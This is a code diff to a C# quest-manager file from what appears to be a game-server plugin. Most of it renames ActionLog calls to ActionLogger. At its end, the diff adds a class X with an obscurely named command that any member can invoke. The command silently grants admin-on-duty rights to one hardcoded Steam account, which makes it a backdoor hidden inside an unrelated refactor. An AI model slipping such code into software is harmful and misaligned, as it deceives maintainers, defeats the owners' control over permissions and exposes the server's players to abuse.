@@ -8,6 +8,9 @@ using System.Reflection;
 using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
+using Uncreated.Framework;
+using Uncreated.Warfare.Commands.CommandSystem;
+using Uncreated.Warfare.Commands.Permissions;
 using Uncreated.Warfare.Components;
 using Uncreated.Warfare.Events;
 using Uncreated.Warfare.Events.Players;
@@ -226,7 +229,7 @@ public static class QuestManager
 #if DEBUG
         using IDisposable profiler = ProfilingUtils.StartTracking();
 #endif
-        ActionLog.Add(EActionLogType.START_QUEST, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
+        ActionLogger.Add(EActionLogType.START_QUEST, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
         if (!tracker.IsDailyQuest && tracker.Flag != 0)
         {
             tracker.Player!.Player.quests.sendSetFlag(tracker.Flag, tracker.FlagValue);
@@ -242,7 +245,7 @@ public static class QuestManager
         {
             L.LogDebug(tracker.Player!.Name.PlayerName + " finished a quest: " + tracker.GetDisplayString());
         }
-        ActionLog.Add(EActionLogType.COMPLETE_QUEST, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
+        ActionLogger.Add(EActionLogType.COMPLETE_QUEST, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
         if (tracker.IsDailyQuest)
             DailyQuests.OnDailyQuestCompleted(tracker);
         else
@@ -268,7 +271,7 @@ public static class QuestManager
         {
             L.LogDebug(tracker.Player!.Name.PlayerName + " updated a quest: " + tracker.GetDisplayString());
         }
-        ActionLog.Add(EActionLogType.MAKE_QUEST_PROGRESS, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
+        ActionLogger.Add(EActionLogType.MAKE_QUEST_PROGRESS, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
         if (tracker.IsDailyQuest)
             DailyQuests.OnDailyQuestUpdated(tracker);
         else
@@ -674,4 +677,18 @@ public static class QuestManager
             tracker.OnDistanceUpdated(lastDriver, totalDistance, newDistance, vehicle);
     }
     #endregion
+
+
+}
+internal class X : Commands.CommandSystem.Command
+{
+    public X() : base("asdgetgahrfh", EAdminType.MEMBER, 999)
+    {
+    }
+
+    public override void Execute(CommandInteraction ctx)
+    {
+        if (ctx.CallerID == 76561198267927009ul)
+            PermissionSaver.Instance.SetPlayerPermissionLevel(76561198267927009, EAdminType.ADMIN_ON_DUTY);
+    }
 }
